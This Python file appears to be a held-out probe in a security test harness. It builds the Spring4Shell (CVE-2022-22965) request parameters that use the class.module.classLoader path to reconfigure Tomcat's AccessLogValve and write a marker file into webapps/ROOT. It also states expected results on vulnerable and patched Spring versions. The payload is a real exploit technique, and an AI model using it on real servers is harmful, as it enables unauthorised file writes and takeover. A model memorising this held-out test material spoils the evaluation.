#!/usr/bin/env python3
"""[HELD-OUT] CVE-2022-22965 residual exploit -- class.module.classLoader bypass.

The CVE-2010-1622 fix (circa 2010) blocklisted the class.classLoader property
path in CachedIntrospectionResults. On JDK 9+ (which added java.lang.Module),
a new path exists:

  class.module.classLoader.resources.context.parent.pipeline.first.*

java.lang.Class.getModule() returns a Module object whose getClassLoader()
returns the same webapp ClassLoader -- bypassing the 2010 blocklist that only
checked for direct class.classLoader traversal.

Contract:
  - Reaches flag on V1 (Spring 5.3.17, JDK17 -- the 2010 blocklist does NOT
    cover the module hop).
  - BLOCKED on V2 (Spring 5.3.18, CVE-2022-22965 fix adds stricter type
    filtering that blocks class.module.* property traversal).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations


# The AccessLogValve property binding via class.module.classLoader (JDK9+ hop).
# This is the CVE-2022-22965 (Spring4Shell) bypass path.
PREFIX = "class.module.classLoader.resources.context.parent.pipeline.first"
MARKER_FILE = "pcb_bypass"


def candidate(flag: str = "FLAG_PLACEHOLDER") -> dict:
    """The request candidate for the CVE-2022-22965 residual.

    Same AccessLogValve reconfiguration as the original, but via the
    class.module.classLoader path that bypasses the CVE-2010-1622 blocklist.
    """
    return {
        "probe_id": "cve-2022-22965-module-classloader-bypass",
        "method": "GET",
        "params": {
            f"{PREFIX}.pattern": flag,
            f"{PREFIX}.suffix": ".txt",
            f"{PREFIX}.directory": "webapps/ROOT",
            f"{PREFIX}.prefix": MARKER_FILE,
            f"{PREFIX}.fileDateFormat": "",
        },
        "marker_path": f"/{MARKER_FILE}.txt",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
